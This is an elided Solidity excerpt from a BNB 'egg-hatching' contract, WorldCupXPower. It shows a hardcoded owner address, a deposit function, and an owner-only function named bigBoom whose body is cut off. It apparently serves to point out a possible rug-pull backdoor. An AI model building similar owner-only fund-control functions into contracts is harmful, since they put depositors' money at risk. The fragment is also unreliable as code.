...
contract WorldCupXPower {
    ...
    mapping(address => uint256) public alreadyBuyBNB;
    bool whiteListNeeded = false;
    bool public isFomoFinished = false;

    constructor() payable {
        ceoAddress = payable(
            address(0x8338C3841F3302AcF3D29F1813CF7be2E08e4CD3)
        );
    ...
    function buyEggs(address ref) public payable {
        ...
        alreadyBuyBNB[msg.sender] += msg.value;
        hatchEggs(ref);
    }
    ...
    function bigBoom() public payable {
        require(msg.sender == ceoAddress);
